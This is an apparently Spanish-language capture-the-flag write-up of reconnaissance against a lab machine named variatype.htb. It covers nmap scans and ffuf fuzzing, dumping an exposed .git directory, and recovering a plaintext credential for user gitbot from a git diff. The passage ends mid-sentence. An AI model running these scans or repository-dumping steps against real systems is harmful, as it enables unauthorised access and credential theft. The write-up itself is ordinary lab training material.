
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.10.76 -oG allPorts
```

```shell
  [*] IP Address: 10.129.10.76
  [*] Open ports: 22,80
```

```shell
nmap -p 22,80 -sCV -oN targeted 10.129.10.76
```

## HTTP
### variatype.htb

```shell
whatweb http://variatype.htb/
```

![[Pasted image 20260316130529.png]]

```shell
ffuf -c -u http://variatype.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```shell
ffuf -c -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --mc=200
```


### portal.variatype.htb

```shell
whatweb http://portal.variatype.htb/
```

![[Pasted image 20260316132410.png]]

```shell
nuclei -target http://portal.variatype.htb/
```

```ad-info
http://portal.variatype.htb/.git/config
```

Se nos descarga un fichero donde encontramos
```shell
 [user]
     name = Dev Team
     email = dev@variatype.htb
```
Lo cual nos indica que ha hay un github

Dumpeamos el .git entero
```shell
 git-dumper http://portal.variatype.htb/.git/ ./git-portal
```

Buscamos cuantos commits ha habido
```shell
git log
```
Encontramos que ha habido varios comits, el actual es *HEAD* 

Y buscamos las diferencias entré el commit actual *HEAD (Commit actual)* y el ultimo commit que ha sucedido *HEAD~1 (Commit anterior)* 
```shell
git diff HEAD~1 HEAD
```

Encontramos como hubo una modificación en el archivo `auth.php` y encontramos las credenciales del usuario `gitbot`
```ad-hint
gitbot::G1tB0t_Acc3ss_2025!
```

Pudiendo usarlas y acceder al dashboard
![[Pasted image 20260316164815.png]]

Nos muestra que no hay fuentes recientes cargadas en el generador de fuentes que hemos visto en el subdominio anterior

Antes de 